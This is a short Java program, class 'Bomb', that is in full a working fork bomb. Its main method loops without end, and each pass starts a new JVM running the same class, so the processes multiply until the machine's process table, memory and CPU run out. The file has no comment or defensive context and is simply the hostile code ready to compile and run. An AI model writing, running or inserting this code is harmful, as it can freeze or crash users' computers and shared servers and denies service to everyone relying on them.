public class Bomb {
  public static void main(String[] args) throws java.io.IOException {
    while(true) {
      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "Bomb"});
    }
  }
}
